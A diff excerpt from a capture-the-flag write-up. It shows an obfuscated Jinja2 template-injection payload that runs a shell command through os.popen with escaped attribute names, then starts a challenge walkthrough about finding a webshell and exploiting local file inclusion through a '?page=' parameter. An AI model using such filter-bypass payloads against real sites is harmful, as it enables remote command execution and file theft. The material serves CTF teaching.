@@ -164,7 +164,7 @@ if __name__ == "__main__":
 # cat flag.txt : \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74
 {% raw %} {%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f'))|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('read')()%} {% endraw %}
 ```
-
+PS: {% raw %} ... {% endraw %} to ignore Github jekyll curly braces process.
 ### b4D h4ck3R <Badge type="danger">Hard</Badge>
 for this Chall we got website (according to chall description got hacked but hacker keep some kind of access), so first thing to do is scan for a webshells using the famous list from [nicoSWD](https://gist.github.com/nicoSWD/5d13af1131a944dc2af856e0675b872b), and found p0wny-shell.php, but seems dead end!, not until few enumeration to hit this vulnerable param `?page=` to LFI, just read source code of this shell, u'll find it encoded use this online tool to decode it & save time [unphp](https://www.unphp.net/), util we got this minified code : 
 ```php
